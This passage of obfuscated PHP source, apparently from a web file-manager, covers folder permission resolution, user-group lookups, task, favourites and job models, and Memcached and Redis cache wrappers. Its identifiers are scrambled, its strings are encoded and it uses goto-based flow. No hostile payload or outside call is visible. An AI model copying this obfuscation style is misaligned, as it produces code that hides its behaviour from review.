$ÔÈâÇ×Â¢Ø²Û = $this->sourceAuthSelect($ĞÂÊÌÑ‘»¤[$¸ÛÃŞÆÉ[85]][$¸ÛÃŞÆÉ[397]]); $› á = $ÔÈâÇ×Â¢Ø²Û ? $this->authMake($ÔÈâÇ×Â¢Ø²Û, $İĞóí·˜Ü‡) : !1; $å›¬øå¹ã‡– = $› á ? $› á[$¸ÛÃŞÆÉ[460]] : !1; $Ş»¶æŒ–[$÷Ğ„Ö¾¹×æ] = $å›¬øå¹ã‡– ? $å›¬øå¹ã‡– : $ÁÃ£ÈÒ×Œ; return $Ş»¶æŒ–[$÷Ğ„Ö¾¹×æ]; } public function authOwnerApply($¡Ø¬á°Ë–é) { $è£ı’íµ =& $_SERVER[èÍ×öˆøÉ]; if (empty($¡Ø¬á°Ë–é[$è£ı’íµ[408]]) || isset($¡Ø¬á°Ë–é[$è£ı’íµ[1951]]) && $¡Ø¬á°Ë–é[$è£ı’íµ[1951]]) { return $¡Ø¬á°Ë–é; } if (AuthModel::authCheckRoot($¡Ø¬á°Ë–é[$è£ı’íµ[408]][$è£ı’íµ[409]])) { return $¡Ø¬á°Ë–é; } $’®Ê®Ãô³ = Model($è£ı’íµ[1256])->parentLevelArray($¡Ø¬á°Ë–é[$è£ı’íµ[515]]); $’®Ê®Ãô³ = array_merge(array($¡Ø¬á°Ë–é[$è£ı’íµ[397]]), array_reverse($’®Ê®Ãô³)); $¤§šŒ¼Ü™ = $this->sourceAuthSelect($’®Ê®Ãô³); $ë× = array(); $¦›¯ = array(); foreach ($¤§šŒ¼Ü™ as $ş˜Ãş => $¢µ) { $¦”Û÷·Ê = $this->authFolderOwnerUser($¢µ); $ë×[$ş˜Ãş] = $¦”Û÷·Ê; $¦›¯ = array_merge($¦›¯, $¦”Û÷·Ê[$è£ı’íµ[588]]); if ($¦”Û÷·Ê[$è£ı’íµ[1952]]) { break; } } if (count($¦›¯) == 0) { $¦›¯ = $this->authFolderOwnerGroup($¡Ø¬á°Ë–é[$è£ı’íµ[498]]); } $¦›¯ = array_unique($¦›¯); if (AuthModel::authCheckRoot($¡Ø¬á°Ë–é[$è£ı’íµ[408]][$è£ı’íµ[409]])) { $¦›¯[] = USER_ID; } $¡Ø¬á°Ë–é[$è£ı’íµ[408]][$è£ı’íµ[1953]] = Model($è£ı’íµ[507])->userListInfo($¦›¯); return $¡Ø¬á°Ë–é; } private function authFolderOwnerGroup($£®øˆ”¤Óóé¿) { $§¼…Ş•ôİ›õ =& $_SERVER[èÍ×öˆøÉ]; $·˜ÑÕ = Model($§¼…Ş•ôİ›õ[1838])->where(array($§¼…Ş•ôİ›õ[1749] => $£®øˆ”¤Óóé¿))->select(); $·ŒÛĞ½Â = array(); if (!$·˜ÑÕ) { return $·ŒÛĞ½Â; } foreach ($·˜ÑÕ as $å™Êã) { $•‚…Ê¡Ò›á· = $this->authInfo($å™Êã); if (AuthModel::authCheckRoot($•‚…Ê¡Ò›á·[$§¼…Ş•ôİ›õ[408]])) { $·ŒÛĞ½Â[] = $å™Êã[$§¼…Ş•ôİ›õ[1582]]; } } return $·ŒÛĞ½Â; } private function authFolderOwnerUser($ûùä) { $ËıŸ« =& $_SERVER[èÍ×öˆøÉ]; $ÀñŸä’Ç = array(); $Ôúî¯ı = !1; foreach ($ûùä as $øÁşèÍª) { $ßà = $this->authInfo($øÁşèÍª); if ($øÁşèÍª[$ËıŸ«[498]] == $ËıŸ«[191]) { $Ôúî¯ı = !0; } if ($øÁşèÍª[$ËıŸ«[406]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ßà[$ËıŸ«[408]])) { $ÀñŸä’Ç[] = $øÁşèÍª[$ËıŸ«[498]]; } } } return array($ËıŸ«[588] => $ÀñŸä’Ç, $ËıŸ«[1952] => $Ôúî¯ı); } public function authMake($ñŞàú‹ØÚ¤, $ß©ö = false) { $•´ =& $_SERVER[èÍ×öˆøÉ]; $›î®ÜøÃ = $this->authArrayCheck($ñŞàú‹ØÚ¤, $ß©ö); if ($›î®ÜøÃ[$•´[1954]]) { $›î®ÜøÃ[$•´[1954]] = $this->sourceAuthInfo($›î®ÜøÃ[$•´[1954]]); } return $›î®ÜøÃ; } public function authArrayCheck($Ñ‹äà, $²Ëßú•ª™‰ = false) { $˜ØÃÉ—ş•Ûá— =& $_SERVER[èÍ×öˆøÉ]; if (!$Ñ‹äà) { return array($˜ØÃÉ—ş•Ûá—[409] => 0, $˜ØÃÉ—ş•Ûá—[460] => !1); } $²Ëßú•ª™‰ = $²Ëßú•ª™‰ ? $²Ëßú•ª™‰ : USER_ID; $Æ‰Õ‘çì¨§Ç = 0; $ó = 0; $˜÷ª™ë…Ö = 0; $“„Ù³²Ç‰… = 0; $ÕÈï¼õ = 0; $—Áô¨¨±Œãä§ = 0; $ˆ×º = 1000; $ÆÙ© = 0; $õáÊ = 0; $Ìô²šøÑ·Ï = 0; $òÙíàáïœ = 0; $Á‘ = array($˜ØÃÉ—ş•Ûá—[397] => 0); foreach ($Ñ‹äà as $Á‘) { $À¶¼®ñ§ÄÙë£ = $this->authInfo($Á‘); if (!$À¶¼®ñ§ÄÙë£) { continue; } $«û = $Á‘[$˜ØÃÉ—ş•Ûá—[498]]; $İÃÚß = intval($À¶¼®ñ§ÄÙë£[$˜ØÃÉ—ş•Ûá—[408]]); if ($Á‘[$˜ØÃÉ—ş•Ûá—[406]] == SourceModel::TYPE_USER && $«û == $²Ëßú•ª™‰) { $Æ‰Õ‘çì¨§Ç = !0; $˜÷ª™ë…Ö = $À¶¼®ñ§ÄÙë£; $ó = $İÃÚß; } else { if ($Á‘[$˜ØÃÉ—ş•Ûá—[406]] == SourceModel::TYPE_GROUP && $this->groupContainUser($«û, $²Ëßú•ª™‰)) { $“„Ù³²Ç‰… = !0; $…û—  = $this->groupStepToUserGroup($«û, $²Ëßú•ª™‰); if ($…û—  < $ˆ×º) { $ˆ×º = $…û— ; $ÕÈï¼õ = $İÃÚß; $—Áô¨¨±Œãä§ = $À¶¼®ñ§ÄÙë£; $ÆÙ© = $«û; } if ($…û—  == $ˆ×º && $İÃÚß >= $ÕÈï¼õ) { $ÕÈï¼õ = $İÃÚß; $—Áô¨¨±Œãä§ = $À¶¼®ñ§ÄÙë£; $ÆÙ© = $«û; } } else { if ($«û == $˜ØÃÉ—ş•Ûá—[191]) { $õáÊ = !0; $òÙíàáïœ = $À¶¼®ñ§ÄÙë£; $Ìô²šøÑ·Ï = $İÃÚß; } } } } if ($Æ‰Õ‘çì¨§Ç) { $ÄÔğ°ªìõ = $ó; $À¶¼®ñ§ÄÙë£ = $˜÷ª™ë…Ö; $‘¸ = LNG($˜ØÃÉ—ş•Ûá—[1955]); } else { if ($“„Ù³²Ç‰…) { $ÄÔğ°ªìõ = $ÕÈï¼õ; $À¶¼®ñ§ÄÙë£ = $—Áô¨¨±Œãä§; $–·ŞÔÓ = Model($˜ØÃÉ—ş•Ûá—[516])->getInfo($ÆÙ©); $‘¸ = $˜ØÃÉ—ş•Ûá—[160] . $–·ŞÔÓ[$˜ØÃÉ—ş•Ûá—[520]] . $˜ØÃÉ—ş•Ûá—[1956] . LNG($˜ØÃÉ—ş•Ûá—[1957]); } else { if ($õáÊ) { $ÄÔğ°ªìõ = $Ìô²šøÑ·Ï; $À¶¼®ñ§ÄÙë£ = $òÙíàáïœ; $‘¸ = LNG($˜ØÃÉ—ş•Ûá—[1928]); } else { $ÄÔğ°ªìõ = 0; $À¶¼®ñ§ÄÙë£ = !1; $‘¸ = $˜ØÃÉ—ş•Ûá—[33]; } } } $¦º¦İƒÕ’¥ = array($˜ØÃÉ—ş•Ûá—[1947] => intval($ÄÔğ°ªìõ), $˜ØÃÉ—ş•Ûá—[1931] => $À¶¼®ñ§ÄÙë£, $˜ØÃÉ—ş•Ûá—[1948] => $‘¸, $˜ØÃÉ—ş•Ûá—[1940] => $Á‘[$˜ØÃÉ—ş•Ûá—[397]]); return $¦º¦İƒÕ’¥; } private function groupContainUser($»¤ÚÎ, $øÈ  = false) { return in_array($»¤ÚÎ, $this->userGroupParents($øÈ )); } private function groupStepToUserGroup($á÷¬§•Ì“–, $½Êä‚ÃçŞò = false) { $ÛëĞ˜€Ã” =& $_SERVER[èÍ×öˆøÉ]; $ÄëµÜÅ˜ÖØš = $this->userGroupList($½Êä‚ÃçŞò); $£Èæ¡íÊ’©©° = 1000; $·®®°Ò = $GLOBALS[$ÛëĞ˜€Ã”[6]][$ÛëĞ˜€Ã”[88]][$ÛëĞ˜€Ã”[1849]] == 1; $´ÜóÒ = $·®®°Ò ? 3 : 2; foreach ($ÄëµÜÅ˜ÖØš as $øöÁ…î¡³) { if ($øöÁ…î¡³[$ÛëĞ˜€Ã”[1749]] == $á÷¬§•Ì“–) { return 0; } $Å«Å€îÅ = explode($ÛëĞ˜€Ã”[47], trim($øöÁ…î¡³[$ÛëĞ˜€Ã”[515]], $ÛëĞ˜€Ã”[47])); if ($Å«Å€îÅ[0] == $ÛëĞ˜€Ã”[191] && count($Å«Å€îÅ) > $´ÜóÒ) { $‹ô‡ = array_reverse(array_slice($Å«Å€îÅ, $´ÜóÒ)); $À€÷ = array_search($á÷¬§•Ì“–, $‹ô‡); if ($À€÷ !== !1 && $À€÷ + 1 <= $£Èæ¡íÊ’©©°) { $£Èæ¡íÊ’©©° = $À€÷ + 1; } } } return $£Èæ¡íÊ’©©°; } private function userGroupList($‡¾ÃÖÌ•´´í’ = false) { $‘§ì¦„Â¹ =& $_SERVER[èÍ×öˆøÉ]; static $ÉÉÀ’„û§Ö = array(); if (isset($ÉÉÀ’„û§Ö[$‡¾ÃÖÌ•´´í’])) { return $ÉÉÀ’„û§Ö[$‡¾ÃÖÌ•´´í’]; } $®Ôİ©ˆ‚ò = Model($‘§ì¦„Â¹[532])->getInfo($‡¾ÃÖÌ•´´í’); $ÉÉÀ’„û§Ö[$‡¾ÃÖÌ•´´í’] = array_to_keyvalue($®Ôİ©ˆ‚ò[$‘§ì¦„Â¹[1929]], $‘§ì¦„Â¹[1749]); return $ÉÉÀ’„û§Ö[$‡¾ÃÖÌ•´´í’]; } public function userGroupParents($¡µóÅŞ) { $¤‰ÙàÖ =& $_SERVER[èÍ×öˆøÉ]; static $š‚Éõß¤ä€¢ = array(); $¡µóÅŞ = $¡µóÅŞ ? $¡µóÅŞ : USER_ID; if (isset($š‚Éõß¤ä€¢[$¡µóÅŞ])) { return $š‚Éõß¤ä€¢[$¡µóÅŞ]; } $Îì‹°”ıæ = $this->userGroupList($¡µóÅŞ); $“ß = array(); $İË²´ÚåÅ´Ä = $GLOBALS[$¤‰ÙàÖ[6]][$¤‰ÙàÖ[88]][$¤‰ÙàÖ[1849]] == 1; $Üèıæ = $İË²´ÚåÅ´Ä ? 3 : 2; foreach ($Îì‹°”ıæ as $³å) { $ãûÔ = array($³å[$¤‰ÙàÖ[1749]]); $Â¥„˜ = explode($¤‰ÙàÖ[47], trim($³å[$¤‰ÙàÖ[515]], $¤‰ÙàÖ[47])); if ($Â¥„˜[0] == $¤‰ÙàÖ[191] && count($Â¥„˜) > $Üèıæ) { $ ò•—Ä…Ô = array_slice($Â¥„˜, $Üèıæ); $ãûÔ = array_merge($ãûÔ, array_reverse($ ò•—Ä…Ô)); } $“ß = array_merge($“ß, $ãûÔ); } $š‚Éõß¤ä€¢[$¡µóÅŞ] = array_unique($“ß); return $š‚Éõß¤ä€¢[$¡µóÅŞ]; } public function authTargetInfoMake($ï–Ôô) { $ÄÜŸåúôôü =& $_SERVER[èÍ×öˆøÉ]; $äéù²ÏÓ = array(); $ÅêªÒâ„ = array(); foreach ($ï–Ôô as $ƒ†¬Ç‘Ñƒ«·) { if ($ƒ†¬Ç‘Ñƒ«·[$ÄÜŸåúôôü[406]] == SourceModel::TYPE_USER) { $äéù²ÏÓ[] = intval($ƒ†¬Ç‘Ñƒ«·[$ÄÜŸåúôôü[498]]); } else { if ($ƒ†¬Ç‘Ñƒ«·[$ÄÜŸåúôôü[406]] == SourceModel::TYPE_GROUP) { $ÅêªÒâ„[] = intval($ƒ†¬Ç‘Ñƒ«·[$ÄÜŸåúôôü[498]]); } } } if ($äéù²ÏÓ) { $äéù²ÏÓ = Model($ÄÜŸåúôôü[507])->userListInfo($äéù²ÏÓ); } if ($ÅêªÒâ„) { $ÖïŞà‹ç = array($ÄÜŸåúôôü[1836] => array($ÄÜŸåúôôü[413], $ÅêªÒâ„)); $ÅêªÒâ„ = Model($ÄÜŸåúôôü[516])->field($ÄÜŸåúôôü[1958])->where($ÖïŞà‹ç)->select(); $ÅêªÒâ„ = array_to_keyvalue($ÅêªÒâ„, $ÄÜŸåúôôü[1749]); } return array($ÄÜŸåúôôü[1959] => $äéù²ÏÓ, $ÄÜŸåúôôü[1960] => $ÅêªÒâ„); } public function authInfo($†èû Ãë) { $«•— =& $_SERVER[èÍ×öˆøÉ]; if ($†èû Ãë[$«•—[1852]]) { $¨±ÀŞ = Model($«•—[501])->listData($†èû Ãë[$«•—[1852]]); if (!$¨±ÀŞ) { return !1; $Û½ã = Model($«•—[501])->listData(); $ Ì½¶ = array_filter_by_field($Û½ã, $«•—[408], $«•—[191]); return $ Ì½¶; } $·è = array_field_key($¨±ÀŞ, array($«•—[395], $«•—[28], $«•—[408], $«•—[1771], $«•—[1772])); $·è[$«•—[1961]] = $†èû Ãë; return $·è; } else { return array($«•—[414] => 0, $«•—[1755] => $†èû Ãë[$«•—[1906]], $«•—[415] => $«•—[33], $«•—[1771] => $«•—[1962]); } } } goto DÒá·áÊª£; EõÏ¯ëË: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\164\x61\163\x6b\x4c\151\163\164"; public $field = array("\x6e\141\155\x65", "\x74\x79\160\x65", "\x65\166\145\x6e\164", "\164\x69\155\x65", "\x64\145\x73\143", "\163\171\163\x74\145\155", "\145\156\x61\142\x6c\x65", "\x6c\x61\x73\x74\122\165\156", "\163\157\x72\x74"); public function listData($Ôú = false, $ŠÃß»¾ = "\x73\157\x72\x74", $˜“êÚ = false) { return parent::listData($Ôú, $ŠÃß»¾, $˜“êÚ); } public function add($µæÃòŒÉ—¶Æ¸) { $æ¼ñ¯ºØßí =& $_SERVER[èÍ×öˆøÉ]; $Ä·şîŞ÷‚Ôóï = $this->findByName($µæÃòŒÉ—¶Æ¸[$æ¼ñ¯ºØßí[28]]); if ($Ä·şîŞ÷‚Ôóï) { return !1; } $µæÃòŒÉ—¶Æ¸[$æ¼ñ¯ºØßí[1546]] = 0; $µæÃòŒÉ—¶Æ¸[$æ¼ñ¯ºØßí[1772]] = $this->getSort(); return parent::insert($µæÃòŒÉ—¶Æ¸); } private function getSort() { $”¤«‡›Æ¹È =& $_SERVER[èÍ×öˆøÉ]; $¨‰ = parent::listData(); $ª£ÏüÆÓµ = array_to_keyvalue($¨‰, $”¤«‡›Æ¹È[33], $”¤«‡›Æ¹È[1772]); return empty($ª£ÏüÆÓµ) ? 0 : max($ª£ÏüÆÓµ) + 1; } public function update($›¬, $–›) { $›­¼ıåÓ =& $_SERVER[èÍ×öˆøÉ]; $ÃË = $this->listData($›¬); $¤™ = $this->findByName($–›[$›­¼ıåÓ[28]]); if (!$ÃË || $¤™ && $¤™[$›­¼ıåÓ[395]] != $ÃË[$›­¼ıåÓ[395]]) { return !1; } return parent::update($›¬, $–›); } public function remove($­œÃïé, $ÂÏ¨Ú¾¹ÎÃ = false) { $ŸÂ¿š§Øô³´Î =& $_SERVER[èÍ×öˆøÉ]; $úªå÷Û‚ = $this->listData($­œÃïé); if (!$úªå÷Û‚) { return; } if (!$ÂÏ¨Ú¾¹ÎÃ && $úªå÷Û‚[$ŸÂ¿š§Øô³´Î[1209]] == $ŸÂ¿š§Øô³´Î[87]) { return !1; } return parent::remove($­œÃïé); } public function enable($Î©üÌâš¨ˆ, $‹Ñüä¼ÌÉ) { return $this->update($Î©üÌâš¨ˆ, array($_SERVER[èÍ×öˆøÉ][2163] => $‹Ñüä¼ÌÉ)); } public function run($İ½Å) { return $this->update($İ½Å, array($_SERVER[èÍ×öˆøÉ][2173] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($Û×ƒæ‡¨–») { $¦‰Õ«ÖÇ =& $_SERVER[èÍ×öˆøÉ]; return array($¦‰Õ«ÖÇ[1859] => array(USER_ID, $¦‰Õ«ÖÇ[2174])); } protected function listData() { $ŠÄ¯øû‚ =& $_SERVER[èÍ×öˆøÉ]; $€€¹Ò = array($ŠÄ¯øû‚[1573] => USER_ID, $ŠÄ¯øû‚[477] => 0); $Ä‡³×ÕÑİı˜ = $ŠÄ¯øû‚[2175]; $˜è› = $this->field($Ä‡³×ÕÑİı˜)->where($€€¹Ò)->order($ŠÄ¯øû‚[2176])->select(); return $˜è› ? $˜è› : array(); } protected function resetCache() { } protected function listView() { $®ôã¾Å–éÈ =& $_SERVER[èÍ×öˆøÉ]; $˜ùİµĞ = $this->listData(); $Ç·‹È‚¸ãâ˜ = array_filter_by_field($˜ùİµĞ, $®ôã¾Å–éÈ[29], $®ôã¾Å–éÈ[411]); $º«ğŞÈœ¶ = array_to_keyvalue($Ç·‹È‚¸ãâ˜, $®ôã¾Å–éÈ[33], $®ôã¾Å–éÈ[76]); if (!$º«ğŞÈœ¶) { return $˜ùİµĞ; } $‹î²Øó¯şÕÄ = 2000; $°À©ô = array($®ôã¾Å–éÈ[412] => array($®ôã¾Å–éÈ[413], $º«ğŞÈœ¶)); $ê‹ŒçÊÂ­ = Model($®ôã¾Å–éÈ[827])->listSource($°À©ô, $‹î²Øó¯şÕÄ); $ê‹ŒçÊÂ­ = array_merge($ê‹ŒçÊÂ­[$®ôã¾Å–éÈ[74]], $ê‹ŒçÊÂ­[$®ôã¾Å–éÈ[75]]); $ê‹ŒçÊÂ­ = array_to_keyvalue($ê‹ŒçÊÂ­, $®ôã¾Å–éÈ[397]); foreach ($˜ùİµĞ as $Ê¥Ù‰— => $úç) { $Š›âû™ = $ê‹ŒçÊÂ­[$úç[$®ôã¾Å–éÈ[76]]]; $Š›âû™ = $Š›âû™ ? $Š›âû™ : array(); $˜ùİµĞ[$Ê¥Ù‰—] = array_merge($Š›âû™, $úç); } return $˜ùİµĞ; } protected function addFav($á¦óŒÕ¿, $ˆ’ùë¢­ÇÜ™ = '', $©í = "\x73\x6f\165\162\x63\145") { $Ã†§é =& $_SERVER[èÍ×öˆøÉ]; $À†Ï‚˜‰ÇåÏ = array($Ã†§é[1573] => USER_ID, $Ã†§é[477] => 0, $Ã†§é[417] => $©í, $Ã†§é[416] => $á¦óŒÕ¿); if ($this->where($À†Ï‚˜‰ÇåÏ)->find()) { return !1; } $À†Ï‚˜‰ÇåÏ = array($Ã†§é[1573] => USER_ID, $Ã†§é[477] => 0); $¦¦Şî±”Â„ö = $this->where($À†Ï‚˜‰ÇåÏ)->max($Ã†§é[1772]); if (!$¦¦Şî±”Â„ö) { $¦¦Şî±”Â„ö = 0; } if (!$ˆ’ùë¢­ÇÜ™ && $©í == $Ã†§é[411]) { $¤Üü‘¦•ŞÅæ = Model($Ã†§é[1256])->where(array($Ã†§é[412] => $á¦óŒÕ¿))->find(); if (!$¤Üü‘¦•ŞÅæ) { return !1; } $ˆ’ùë¢­ÇÜ™ = $¤Üü‘¦•ŞÅæ[$Ã†§é[28]]; } $ˆ’ùë¢­ÇÜ™ = $this->getAutoName($ˆ’ùë¢­ÇÜ™); $¸É = array($Ã†§é[1573] => USER_ID, $Ã†§é[477] => 0, $Ã†§é[415] => $ˆ’ùë¢­ÇÜ™, $Ã†§é[416] => $á¦óŒÕ¿, $Ã†§é[417] => $©í, $Ã†§é[1753] => $¦¦Şî±”Â„ö + 1); return $this->add($¸É); } protected function remove($¯†) { $ñøÕÍó =& $_SERVER[èÍ×öˆøÉ]; $÷ôÈ = array($ñøÕÍó[1573] => USER_ID, $ñøÕÍó[414] => $¯†); return $this->where($÷ôÈ)->delete(); } protected function removeByName($‡ııñºÊ) { $œÖÎ®Ã¤ÑƒßÏ =& $_SERVER[èÍ×öˆøÉ]; $ñ½©¢™ŸšŸ = array($œÖÎ®Ã¤ÑƒßÏ[1573] => USER_ID, $œÖÎ®Ã¤ÑƒßÏ[415] => $‡ııñºÊ, $œÖÎ®Ã¤ÑƒßÏ[477] => 0); return $this->where($ñ½©¢™ŸšŸ)->delete(); } protected function rename($àË, $×´“çÙ) { $×•¾‰æ›÷ =& $_SERVER[èÍ×öˆøÉ]; if ($àË == $×´“çÙ) { return !1; } $¶ÂŸ¢Ã = $this->getAutoName($×´“çÙ); if ($×´“çÙ != $¶ÂŸ¢Ã) { return !1; } $³ôÆÂœ±Ÿô = array($×•¾‰æ›÷[1573] => USER_ID, $×•¾‰æ›÷[477] => 0, $×•¾‰æ›÷[28] => $àË); return $this->where($³ôÆÂœ±Ÿô)->save(array($×•¾‰æ›÷[28] => $×´“çÙ)); } protected function resetSort($¶Å­¢²™¾í¼ì) { $Çõ‹Çİ =& $_SERVER[èÍ×öˆøÉ]; $¶Å­¢²™¾í¼ì = is_array($¶Å­¢²™¾í¼ì) ? $¶Å­¢²™¾í¼ì : array(); $„ºÎ¼’öİ· = array($Çõ‹Çİ[1573] => USER_ID); for ($¨ŠÆ’¨£’Ë×à = 0; $¨ŠÆ’¨£’Ë×à < count($¶Å­¢²™¾í¼ì); $¨ŠÆ’¨£’Ë×à++) { $„ºÎ¼’öİ·[$Çõ‹Çİ[414]] = $¶Å­¢²™¾í¼ì[$¨ŠÆ’¨£’Ë×à]; $this->where($„ºÎ¼’öİ·)->save(array($Çõ‹Çİ[1753] => $¨ŠÆ’¨£’Ë×à + 1)); } return !0; } protected function moveTop($°Ê) { $ ®´…Æšéµ›ı =& $_SERVER[èÍ×öˆøÉ]; $¤¢ı = array($ ®´…Æšéµ›ı[1573] => USER_ID, $ ®´…Æšéµ›ı[477] => 0); $‰‹Ÿ = $this->where($¤¢ı)->where(array($ ®´…Æšéµ›ı[28] => $°Ê))->find(); if (!$‰‹Ÿ) { return; } $ì‹¥í•Æœë½¤ = $this->field($ ®´…Æšéµ›ı[395])->where($¤¢ı)->order($ ®´…Æšéµ›ı[2176])->select(); $ì‹¥í•Æœë½¤ = array_to_keyvalue($ì‹¥í•Æœë½¤, $ ®´…Æšéµ›ı[33], $ ®´…Æšéµ›ı[395]); $–µšä£€ë = $ì‹¥í•Æœë½¤; $ì‹¥í•Æœë½¤ = array_remove_value($ì‹¥í•Æœë½¤, $‰‹Ÿ[$ ®´…Æšéµ›ı[395]]); array_unshift($ì‹¥í•Æœë½¤, $‰‹Ÿ[$ ®´…Æšéµ›ı[395]]); return $this->resetSort($ì‹¥í•Æœë½¤); } protected function moveBottom($Ÿ¨) { $ëŸ˜Íô‹Øõã =& $_SERVER[èÍ×öˆøÉ]; $Â³‹ãúö±Ô = array($ëŸ˜Íô‹Øõã[1573] => USER_ID, $ëŸ˜Íô‹Øõã[477] => 0); $Ò’‰Á = $this->where($Â³‹ãúö±Ô)->max($ëŸ˜Íô‹Øõã[1772]); $æéã£èÂı¨»ê = array($ëŸ˜Íô‹Øõã[1772] => $Ò’‰Á + 1); return $this->where($Â³‹ãúö±Ô)->where(array($ëŸ˜Íô‹Øõã[28] => $Ÿ¨))->save($æéã£èÂı¨»ê); } private function getAutoName($¡) { $‘Ò˜ÊÚ´é =& $_SERVER[èÍ×öˆøÉ]; $ğåĞà¥Ù¤İˆÈ = array($‘Ò˜ÊÚ´é[1573] => USER_ID, $‘Ò˜ÊÚ´é[477] => 0); $©¢áş = $this->field($‘Ò˜ÊÚ´é[28])->where($ğåĞà¥Ù¤İˆÈ)->select(); $©¢áş = array_to_keyvalue($©¢áş, $‘Ò˜ÊÚ´é[33], $‘Ò˜ÊÚ´é[28]); if (!$©¢áş || !in_array($¡, $©¢áş)) { return $¡; } for ($’Ò´¯¨µ’âš = 0; $’Ò´¯¨µ’âš < count($©¢áş); $’Ò´¯¨µ’âš++) { if (!in_array($¡ . "\x28{$’Ò´¯¨µ’âš}\x29", $©¢áş)) { return $¡ . "\x28{$’Ò´¯¨µ’âš}\51"; } } return $¡ . "\x28{$’Ò´¯¨µ’âš}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\x6a\x6f\x62\x4c\151\163\164"; public $field = array("\x6e\141\155\x65", "\144\145\x73\x63", "\x73\x6f\162\x74"); const JOB_KEY = "\163\x65\x6c\146\112\157\x62\114\151\163\164"; public function listData($†”¿Ï = false, $÷ –å = "\163\x6f\162\x74", $‡ŒŠšÊÖŞÒÜ = false) { return parent::listData($†”¿Ï, $÷ –å, $‡ŒŠšÊÖŞÒÜ); } public function remove($•™Û—Â) { return parent::remove($•™Û—Â); } public function add($¾›Ò¯) { $ş“ =& $_SERVER[èÍ×öˆøÉ]; if ($this->findByName($¾›Ò¯[$ş“[28]])) { return !1; } $¾›Ò¯[$ş“[1772]] = $this->getSort(); return parent::insert($¾›Ò¯); } private function getSort() { $à›ØÖ†½¥£ =& $_SERVER[èÍ×öˆøÉ]; $Ó‘×’åàßŠ = parent::listData(); $ü‘µô‰†Ô‰À£ = array_to_keyvalue($Ó‘×’åàßŠ, $à›ØÖ†½¥£[33], $à›ØÖ†½¥£[1772]); return empty($ü‘µô‰†Ô‰À£) ? 0 : max($ü‘µô‰†Ô‰À£) + 1; } public function update($È²¬, $ƒ¦©±µ™¡Ü) { $²öÜ¦ü´ =& $_SERVER[èÍ×öˆøÉ]; $¢£¡ñ = parent::listData($È²¬); $¡·† = $this->findByName($ƒ¦©±µ™¡Ü[$²öÜ¦ü´[28]]); if (!$¢£¡ñ || $¡·† && $¡·†[$²öÜ¦ü´[395]] != $¢£¡ñ[$²öÜ¦ü´[395]]) { return !1; } return parent::update($È²¬, $ƒ¦©±µ™¡Ü); } public function setUserJob($¥ü¯—úÑùô, $²³¯”‹ÒÅÛ) { $†îâšº =& $_SERVER[èÍ×öˆøÉ]; if (!is_array($²³¯”‹ÒÅÛ)) { $²³¯”‹ÒÅÛ = array($²³¯”‹ÒÅÛ); } $ùÅ• = parent::listData(); $Ìªæ¯ = array_to_keyvalue($ùÅ•, $†îâšº[28]); $’éÕ = $†îâšº[376]; foreach ($²³¯”‹ÒÅÛ as $³à§á’¹ş•) { if ($Ìªæ¯[$³à§á’¹ş•]) { $’éÕ .= $Ìªæ¯[$³à§á’¹ş•][$†îâšº[395]] . $†îâšº[47]; } else { $Ä÷ ±¸õç = $this->add($³à§á’¹ş•); $’éÕ .= $Ä÷ ±¸õç . $†îâšº[47]; } } $’éÕ = rtrim($’éÕ, $†îâšº[47]); Model($†îâšº[532])->metaSet($¥ü¯—úÑùô, self::JOB_KEY, $’éÕ); } public function getUserJob($îŠ¹óñÓ×) { $¿ï = Model($_SERVER[èÍ×öˆøÉ][532])->metaGet($îŠ¹óñÓ×); return $this->getUserJobInfo($¿ï[self::JOB_KEY]); } public function getUserJobInfo($¥µµ®”ë) { $ŠÔ÷€“‚Ñ« =& $_SERVER[èÍ×öˆøÉ]; $÷ÛÄ’ÊßßÕ = explode($ŠÔ÷€“‚Ñ«[47], $¥µµ®”ë); $ˆø–áĞš = parent::listData(); $ˆø–áĞš = array_remove_key($ˆø–áĞš, $ŠÔ÷€“‚Ñ«[194]); $¾Ò¹ = array(); foreach ($÷ÛÄ’ÊßßÕ as $”Ú) { if (isset($ˆø–áĞš[$”Ú])) { $¾Ò¹[] = $ˆø–áĞš[$”Ú]; } } return $¾Ò¹; } } goto cñÅÛçÃ; f«Æ’ÛŠë„: class CacheMemcached { public $handle; public $cacheTime; public function __construct($çòŒ³€¼Ş¼¥, $ÑÙ®Ä¦Ú—ó) { $øØûÙ =& $_SERVER[èÍ×öˆøÉ]; if (!class_exists($øØûÙ[864])) { show_json($øØûÙ[865], !1); } $this->cacheTime = $ÑÙ®Ä¦Ú—ó; $this->handle = new Memcached(); if (is_array($çòŒ³€¼Ş¼¥[$øØûÙ[866]]) && count($çòŒ³€¼Ş¼¥[$øØûÙ[866]]) >= 1) { foreach ($çòŒ³€¼Ş¼¥[$øØûÙ[866]] as $ˆ‘ƒâ®•â) { $ñÎ¹èıè¬ = explode($øØûÙ[4], $ˆ‘ƒâ®•â); $this->handle->addServer($ñÎ¹èıè¬[0], $ñÎ¹èıè¬[1]); } } else { $this->handle->addServer($çòŒ³€¼Ş¼¥[$øØûÙ[175]], $çòŒ³€¼Ş¼¥[$øØûÙ[176]]); } } public function set($µèøÁÖ“È, $ß±Á, $—¢¼Ì…÷‘ = false) { $—¢¼Ì…÷‘ = $—¢¼Ì…÷‘ ? $—¢¼Ì…÷‘ : $this->cacheTime; return $this->handle->set($µèøÁÖ“È, $ß±Á, $—¢¼Ì…÷‘); } public function get($ëÑÖ›¢ÙÑª¡) { return $this->handle->get($ëÑÖ›¢ÙÑª¡); } public function remove($Éœæë) { return $this->handle->delete($Éœæë); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ì×…‹ ù¼±•¡, $ÈÖ) { $ÔËüıòêğÑ =& $_SERVER[èÍ×öˆøÉ]; if (!class_exists($ÔËüıòêğÑ[867])) { show_json($ÔËüıòêğÑ[868], !1); } $this->cacheTime = $ÈÖ; $ÈêÅÜò–àÜ = isset($Ì×…‹ ù¼±•¡[$ÔËüıòêğÑ[869]]) ? $Ì×…‹ ù¼±•¡[$ÔËüıòêğÑ[869]] : 10; $¦ÆÜ = _get($Ì×…‹ ù¼±•¡, $ÔËüıòêğÑ[866]); if ($¦ÆÜ && is_array($¦ÆÜ)) { $this->initCluster($Ì×…‹ ù¼±•¡, 